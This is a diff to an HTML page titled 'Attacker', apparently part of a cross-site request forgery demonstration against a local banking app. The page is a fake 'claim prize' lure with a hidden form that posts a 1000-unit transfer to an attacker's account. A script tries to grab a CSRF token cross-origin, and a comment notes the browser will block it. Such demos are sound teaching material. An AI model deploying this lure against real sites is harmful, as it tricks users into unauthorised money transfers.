@@ -9,17 +9,7 @@
           integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
     <title>Attacker</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-    <script>
-        $.post('/csrf', {}, function (data, status) {
-            const csrf_token = data;
-            $('<input>').attr({
-                type: 'hidden',
-                id: 'X-CSRFToken',
-                name: 'csrf_token',
-                value: data.csrf
-            }).appendTo('my_data_form');
-        });
-    </script>
+
 </head>
 <body>
 <div class="container">
@@ -30,12 +20,24 @@
         <hr>
         <p class="mb-0">Click this button to ensure that you are not a robot and claim prize.</p>
         <form id="my_data_form" method="post" action="http://localhost:8080/mydata">
-                <input type="hidden" name="receiver_account_number" class="form-control" id="receiver_account_number" value="hacker">
+                <input type="hidden" name="receiver_account_number" class="form-control" id="receiver_account_number" value="4653215468564">
                 <input type="hidden" name="value" class="form-control" id="value" value="1000">
             <button type="submit" class="btn btn-success btn-lg">Claim Gift!!</button>
         </form>
     </div>
 </div>
-
+<script>
+    //Even though hacker written this ajax request, it will not
+    // accepted by the server since ajax not allowed to perform cross domain operations.
+    $.post('http://localhost:8080/csrf', {}, function (data, status) {
+        const csrf_token = data;
+        $('<input>').attr({
+            type: 'hidden',
+            id: 'X-CSRFToken',
+            name: 'csrf_token',
+            value: data.csrf
+        }).appendTo('my_data_form');
+    });
+</script>
 </body>
 </html>
